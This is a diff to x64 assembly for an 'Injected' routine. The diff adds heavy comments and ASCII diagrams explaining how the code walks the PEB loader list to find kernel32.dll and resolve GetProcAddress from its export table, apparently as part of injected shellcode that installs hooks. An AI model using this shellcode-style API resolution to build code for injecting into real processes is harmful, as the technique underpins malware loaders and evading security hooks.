@@ -218,87 +218,364 @@ Injected PROC
     push r15
     sub rsp, 50h
 
-    ; Save GetProcAddress (assuming it was passed in RCX)
+; Save GetProcAddress (assuming it was passed in RCX)
+; --- Initial Setup ---
+; Save GetProcAddress (assuming it was passed in RCX by the loader/caller)
+; This is a placeholder/assumption based on the comment. The subsequent code
+; dynamically FINDS GetProcAddress, making this initial save potentially redundant
+; or part of a larger context not shown here.
+; R15 will eventually hold the dynamically found GetProcAddress VA.
     mov r15, rcx
 
-     ; --- Find Kernel32 Base Address (Keep existing PEB method if it works) ---
-    ; (Assuming the PEB walk to get Kernel32 base into RBX is working correctly)
+; --- Find Kernel32 Base Address (Keep existing PEB method if it works) ---
+; (Assuming the PEB walk to get Kernel32 base into RBX is working correctly)
+; --- Find Kernel32 Base Address via PEB LDR ---
+; This section walks the Process Environment Block (PEB) and its Loader Data (LDR)
+; to find the base address of kernel32.dll in memory. This is a standard technique
+; for dynamically finding loaded modules without relying on potentially hooked APIs.
+
+; Access the PEB via the Thread Environment Block (TEB) using the GS segment register.
+; GS:[60h] -> PEB address
     xor rax, rax
     mov rax, gs:[60h]                 ; PEB
+;
+;    GS Segment Base         TEB                   PEB
+;    +-----------------+     +-----------------+     +-----------------+
+;    | ...             | --> | ...             | --> | ...             |
+;    | 0x60: PEB Ptr   | ----+                 |     | 0x18: Ldr Ptr   | ----+
+;    | ...             |     | ...             |     | ...             |     |
+;    +-----------------+     +-----------------+     +-----------------+     |
+;                                                                            V
+; Get the pointer to the PEB_LDR_DATA structure.
+; PEB+18h -> LDR_DATA address
     mov rax, [rax+18h]                ; LDR_DATA
+;
+;        PEB                   PEB_LDR_DATA
+;      +-----------------+     +-------------------------------------+
+;      | ...             |     | ...                                 |
+;      | 0x18: Ldr Ptr   | --> | 0x30: InInitializationOrderModuleList | ----+
+;      | ...             |     | ...                                 |     |
+;      +-----------------+     +-------------------------------------+     |
+;                                                                          V
+; Get the Flink (forward link) of the InInitializationOrderModuleList.
+; This list contains modules in the order they were initialized.
+; The first entry usually points back to the head, the second is the executable,
+; the third is ntdll.dll, and the fourth is typically kernel32.dll.
+; LDR_DATA+30h -> LIST_ENTRY.Flink (points to the first entry's Flink)
     mov rsi, [rax+30h]                ; InInitializationOrderModuleList.Flink
+;
+;         LDR_DATA                      LIST_ENTRY (Head)        LIST_ENTRY (Ntdll)       LIST_ENTRY (Kernel32)
+;       +------------------------+      +-----------------+      +-----------------+      +-----------------+
+; ...   | 0x30: InitOrderFlink | ---> | Flink           | ---> | Flink           | ---> | Flink           | -> ...
+;       | 0x38: InitOrderBlink | --   | Blink           | <--- | Blink           | <--- | Blink           | <- ...
+; ...   +------------------------+ |  | ...             |      | ...             |      | ...             |
+;                                |  | ModuleEntry Ptr |      | ModuleEntry Ptr |      | ModuleEntry Ptr |
+;                                |  +-----------------+      +-----------------+      +-----------------+
+;                                +------------------------------------------------------------^ (Points to list head entry itself)
+;
+; Traverse the linked list to get to the kernel32.dll entry.
+; Current RSI -> List Head Entry -> Executable Entry -> Ntdll Entry -> Kernel32 Entry
     mov rsi, [rsi]                    ; -> ntdll entry
     mov rsi, [rsi]                    ; -> kernel32 entry
+;
+;        ... -> LIST_ENTRY (Ntdll)       LIST_ENTRY (Kernel32)      LDR_DATA_TABLE_ENTRY (Kernel32)
+;               +-----------------+      +-----------------+        +-----------------+
+;            -> | Flink           | ---> | Flink           | --+    | ...             |
+;               | Blink           | <--- | Blink           |   |    | 0x10: DllBase   | ----> Kernel32 Base Address
+;               | ...             |      | ...             |   +--> | ...             |
+;               | ModuleEntry Ptr | ---> | ModuleEntry Ptr |        | FullDllName     |
+;               +-----------------+      +-----------------+        | ...             |
+;                                                                   +-----------------+
+;
+; Get the base address (DllBase) of kernel32.dll from its LDR_DATA_TABLE_ENTRY.
+; LDR_DATA_TABLE_ENTRY+10h -> DllBase
     mov rbx, [rsi+10h]                ; RBX = Kernel32 Base Address
 
 ; --- Find GetProcAddress within kernel32.dll export table ---
 ; 1. Find the export directory
+; --- Find GetProcAddress within kernel32.dll export table ---
+; Now that we have the base address of Kernel32.dll (in RBX), we need to parse
+; its PE (Portable Executable) header to find the Export Address Table (EAT),
+; and then search that table for the address of the 'GetProcAddress' function.
+; 1. Find the PE header and the Export Directory.
+; Get the offset to the PE header ('PE\0\0' signature) from the DOS header.
+; Kernel32Base + 3Ch -> IMAGE_DOS_HEADER.e_lfanew (Offset to PE Header)
 mov eax, [rbx+3Ch]    ; Get PE header offset
+
+;
+;    Kernel32.dll Base (RBX)
+;    +-------------------------+
+;    | MZ Header ('MZ'...)     |
+;    | ...                     |
+;    | 0x3C: e_lfanew (Offset) | ---> Value 'X'
+;    | ...                     |
+;    +-------------------------+
+;      |
+;      +-----> (RBX + 'X') = PE Header Address
+;
+; Calculate the virtual address (VA) of the PE header.
+; R13 = Kernel32 Base + PE Header Offset
 lea r13, [rbx+rax]    ; R13 = PE header address
     
 ; Get export directory VA - different offset for 64-bit PE
+;
+;    Kernel32.dll Memory Layout
+;    +-------------------------+ <-- RBX (Base Address)
+;    | DOS Header              |
+;    | ...                     |
+;    | DOS Stub                |
+;    | ...                     |
+;    +-------------------------+ <-- R13 (PE Header Address)
+;    | PE Signature ('PE\0\0') |
+;    | IMAGE_FILE_HEADER       |
+;    | IMAGE_OPTIONAL_HEADER64 |
+;    | ...                     |
+;    | Data Directories        | ----+
+;    | ...                     |     |
+;    | Section Headers         |     |
+;    | ...                     |     V
+;    +-------------------------+
+;
+
+; Get the Relative Virtual Address (RVA) of the Export Directory Table.
+; This is located within the Data Directories array in the Optional Header.
+; For 64-bit PE files, the Export Table entry is at offset 88h from the PE header start.
+; PE Header + 88h -> IMAGE_OPTIONAL_HEADER64.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
 mov eax, [r13+88h]    ; RAX = export directory RVA
+;
+;    PE Header (R13)
+;    +-----------------------------+
+;    | PE Signature                |
+;    | File Header                 |
+;    | Optional Header             |
+;    | ...                         |
+;    | 0x88: Export Dir RVA ------ | ---> Value 'Y' (Export Directory RVA)
+;    | 0x90: Export Dir Size       |
+;    | 0x98: Import Dir RVA        |
+;    | ...                         |
+;    +-----------------------------+
+;
+; Calculate the virtual address (VA) of the Export Directory.
+; R14 = Kernel32 Base + Export Directory RVA
 lea r14, [rbx+rax]    ; R14 = export directory VA
     
 ; Get number of functions
+;
+;    Kernel32.dll Memory Layout
+;    +-------------------------+ <-- RBX (Base Address)
+;    | ...                     |
+;    | PE Header               |
+;    | ...                     |
+;    +-------------------------+ <-- R14 (Export Directory VA)
+;    | Export Directory Data   |
+;    | ...                     |
+;    +-------------------------+
+;
+; 2. Get pointers to the necessary arrays within the Export Directory.
+
+; Get the number of function names in the export table.
+; Export Directory + 18h -> NumberOfNames
 mov ecx, [r14+18h]    ; ECX = number of functions (NumberOfNames)
     
 ; Get address arrays
-mov eax, [r14+1Ch]    ; EAX = AddressOfFunctions RVA
-lea r8, [rbx+rax]     ; R8 = AddressOfFunctions VA
+;
+;    Export Directory (R14)
+;    +--------------------------------+
+;    | ...                            |
+;    | 0x18: NumberOfNames            | ---> Value 'N' (Count of names) stored in ECX
+;    | 0x1C: AddressOfFunctions RVA   |
+;    | 0x20: AddressOfNames RVA       |
+;    | 0x24: AddressOfNameOrdinals RVA|
+;    | ...                            |
+;    +--------------------------------+
+;
+
+; Get the RVA of the Export Address Table (EAT) - an array of function RVAs.
+; Export Directory + 1Ch -> AddressOfFunctions RVA
+;
+;    Kernel32.dll Memory Layout             Export Directory (R14)        AddressOfFunctions Array (R8)
+;    +-------------------------+            +-------------------------+     +-------------------------+
+;    | ...                     |            | ...                     |     | RVA Func 0              | <-- Indexed by Ordinal
+;    | Export Directory        | ---------> | 0x1C: AddrOfFunc RVA -> | --> | RVA Func 1              |
+;    | ...                     |            | ...                     |     | ...                     |
+;    +-------------------------+            +-------------------------+     | RVA Func N-1            |
+;                                                                           +-------------------------+
+;
+
+; Get the RVA of the Export Name Pointer Table (ENPT) - an array of name RVAs.
+; Export Directory + 20h -> AddressOfNames RVA
+    mov eax, [r14+1Ch]    ; EAX = AddressOfFunctions RVA
+
+; Calculate the VA of the Export Address Table (EAT).
+; R8 = Kernel32 Base + AddressOfFunctions RVA
+
+    lea r8, [rbx+rax]     ; R8 = AddressOfFunctions VA
+
+;
+;    Kernel32.dll Memory Layout             Export Directory (R14)        AddressOfFunctions Array (R8)
+;    +-------------------------+            +-------------------------+     +-------------------------+
+;    | ...                     |            | ...                     |     | RVA Func 0              | <-- Indexed by Ordinal
+;    | Export Directory        | ---------> | 0x1C: AddrOfFunc RVA -> | --> | RVA Func 1              |
+;    | ...                     |            | ...                     |     | ...                     |
+;    +-------------------------+            +-------------------------+     | RVA Func N-1            |
+;                                                                           +-------------------------+
+;
+; Get the RVA of the Export Name Pointer Table (ENPT) - an array of name RVAs.
+; Export Directory + 20h -> AddressOfNames RVA
+    mov eax, [r14+20h]    ; EAX = AddressOfNames RVA
     
-mov eax, [r14+20h]    ; EAX = AddressOfNames RVA
-lea r9, [rbx+rax]     ; R9 = AddressOfNames VA
-    
-mov eax, [r14+24h]    ; EAX = AddressOfNameOrdinals RVA
-lea r10, [rbx+rax]    ; R10 = AddressOfNameOrdinals VA
+; Calculate the VA of the Export Name Pointer Table (ENPT).
+; R9 = Kernel32 Base + AddressOfNames RVA
+    lea r9, [rbx+rax]     ; R9 = AddressOfNames VA
+;
+;    Kernel32.dll Memory Layout             Export Directory (R14)        AddressOfNames Array (R9)
+;    +-------------------------+            +-------------------------+     +-------------------------+
+;    | ...                     |            | ...                     |     | RVA Name 0 -------------+---> "FunctionNameA"
+;    | Export Directory        | ---------> | 0x20: AddrOfNames RVA ->| --> | RVA Name 1 -------------+---> "FunctionNameB"
+;    | ...                     |            | ...                     |     | ...                     |
+;    +-------------------------+            +-------------------------+     | RVA Name N-1 -----------+---> "GetProcAddress"
+;                                                                           +-------------------------+     ^--- (Example, if found)
+;           
+; Get the RVA of the Export Ordinal Table (EOT) - an array of WORD ordinals.
+; Export Directory + 24h -> AddressOfNameOrdinals RVA 
+    mov eax, [r14+24h]    ; EAX = AddressOfNameOrdinals RVA
+; Calculate the VA of the Export Ordinal Table (EOT).
+; R10 = Kernel32 Base + AddressOfNameOrdinals RVA
+    lea r10, [rbx+rax]    ; R10 = AddressOfNameOrdinals VA
     
 ; Now start loop to find GetProcAddress
-xor rsi, rsi          ; RSI = index counter
+;
+;    Kernel32.dll Memory Layout             Export Directory (R14)        AddressOfNameOrdinals Array (R10)
+;    +-------------------------+            +-------------------------+     +-------------------------+
+;    | ...                     |            | ...                     |     | Ordinal 0 (WORD)        | <-- Maps Name Index to Function Index (Ordinal)
+;    | Export Directory        | ---------> | 0x24: AddrOfOrd RVA --->| --> | Ordinal 1 (WORD)        |
+;    | ...                     |            | ...                     |     | ...                     |
+;    +-------------------------+            +-------------------------+     | Ordinal N-1 (WORD)      |
+;                                                                           +-------------------------+
+;                                                                            ^--- Indexed by RSI*2
+
+; 3. Loop through the exported names to find "GetProcAddress".
+
+; Initialize index counter for the names array.
+    xor rsi, rsi          ; RSI = index counter
     
 find_getprocaddr_loop:
     ; Check if we've checked all functions
+    ; Check if we have iterated through all the names in the AddressOfNames array.
+    ; Compare current index (RSI) with the total number of names (ECX).
     cmp rsi, rcx
     jae SkipHooks     ; If we've checked all functions and not found it
     
     ; Get the name RVA for this function
+    ; Get the RVA of the current function name from the AddressOfNames array (R9).
+    ; Each entry is a 4-byte RVA.
+    ; EAX = RVA of function name at index RSI
     mov eax, [r9+rsi*4]   ; EAX = RVA of current function name
+;
+;    AddressOfNames Array (R9)                     Name String Memory Location
+;    +-------------------------+                   +------------------+
+;    | RVA Name 0              |                   | FunctionNameA \0 |
+;    | ...                     |                   +------------------+
+;    | RVA Name RSI -----------|-----------------> | Current Func Name\0| <-- RDI will point here
+;    | ...                     |                   +------------------+
+;    +-------------------------+                    ^ -- (RBX + EAX)
+;     ^-- R9 + RSI*4
+;
+
+; Calculate the VA of the current function name string.
+; RDI = Kernel32 Base + Name RVA
     lea rdi, [rbx+rax]    ; RDI = VA of current function name
     
-    ; Pointer to our string to compare
+; Pointer to our string to compare
+; Get the VA of our target string "GetProcAddress".
+; Assume GetProcAddrStr is defined elsewhere in the data section.
     lea r11, [GetProcAddrStr]
     
-    ; Compare strings
+;
+;    Current Func Name (RDI)     Target String (R11)
+;    +---------------------+     +---------------------+
+;    | 'C' 'u' 'r' 'r' ... |     | 'G' 'e' 't' 'P' ... |
+;    +---------------------+     +---------------------+
+;      ^                           ^
+;      |                           |
+;     RDI                         R11
+;
+
+; Compare the current function name (pointed to by RDI) with "GetProcAddress" (pointed to by R11).
 compare_str:
     movzx eax, byte ptr [rdi]   ; Get byte from function name
     movzx edx, byte ptr [r11]   ; Get byte from our string
+; Check if we reached the null terminator of the current function name.
     test eax, eax
     jz check_end
+; Compare the bytes.
     cmp eax, edx
     jne next_function
+; Bytes match, advance pointers to the next character.
     inc rdi
     inc r11
     jmp compare_str
     
 check_end:
+; We reached the end of the function name string ([RDI] == 0).
+; Now check if we also reached the end of our target string "GetProcAddress"
     test edx, edx           ; If our string also ended, we have a match
     jnz next_function     ; If not, strings don't match
     
-    ; Found GetProcAddress, get its ordinal
+; Found GetProcAddress, get its ordinal
+; 4. Get the function address using the matched index (RSI).
+
+; Get the ordinal associated with this name index (RSI).
+; The ordinal is stored in the AddressOfNameOrdinals array (R10).
+; Each entry is a 2-byte WORD.
+; EAX = Ordinal value (zero-extended to 32 bits)
     movzx eax, word ptr [r10+rsi*2]  ; EAX = ordinal (zero extended to 32-bit)
     
-    ; Use the ordinal to get the function address
+; Use the ordinal to get the function address
+;
+;    AddressOfNameOrdinals Array (R10)
+;    +-------------------------+
+;    | Ordinal 0 (WORD)        |
+;    | ...                     |
+;    | Ordinal RSI (WORD) -----| ---> Value 'Ord' (The ordinal for the matched name)
+;    | ...                     |
+;    +-------------------------+
+;     ^-- R10 + RSI*2
+;
+
+; Use the ordinal (EAX) as an index into the AddressOfFunctions array (R8)
+; to get the RVA of the actual GetProcAddress function.
+; Note: The ordinal is the direct index into the AddressOfFunctions array.
+; EAX = RVA of the function
     mov eax, [r8+rax*4]   ; EAX = RVA of function
+;
+;    AddressOfFunctions Array (R8)              Function Code Location
+;    +-------------------------+                +----------------------+
+;    | RVA Func 0              |                | GetProcAddress Code  | <-- R15 will point here
+;    | ...                     |                | ...                  |
+;    | RVA Func 'Ord' ---------|--------------->|                      |
+;    | ...                     |                +----------------------+
+;    +-------------------------+                 ^ -- (RBX + EAX)
+;     ^-- R8 + Ordinal*4
+;
+
+; Calculate the final Virtual Address (VA) of GetProcAddress.
+; R15 = Kernel32 Base + Function RVA
     lea r15, [rbx+rax]    ; R15 = VA of GetProcAddress
+; Jump to the rest of the code, R15 now holds the address of GetProcAddress.
     jmp continue_with_getprocaddr
-    
+
+; Label for moving to the next function name if the current one doesn't match.
 next_function:
     inc rsi
     jmp find_getprocaddr_loop
-    
+
+; continue_with_getprocaddr: Label to jump to after successfully finding GetProcAddress.
 continue_with_getprocaddr:
 
-
+    ; R15 now contains the valid Virtual Address of the GetProcAddress function.
+    ; The rest of the shellcode/program can now use R15 to call GetProcAddress.
+    ; Example: call r15
 
     ; --- Get EXE Base Address using GetModuleHandleA(NULL) ---
     ; 1. Get address of GetModuleHandleA itself
